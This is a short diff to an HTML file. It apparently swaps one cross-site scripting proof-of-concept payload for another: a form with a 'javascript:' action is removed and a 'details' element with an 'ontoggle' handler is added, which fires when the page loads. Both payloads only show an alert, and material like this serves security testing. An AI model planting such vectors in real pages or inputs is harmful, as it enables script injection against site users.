@@ -1,3 +1,1 @@
-<form action="javascript:alert(document.domain)">
-  <input type=submit>
-</form>
+<details open ontoggle="alert(document.domain)">Click Me</details>
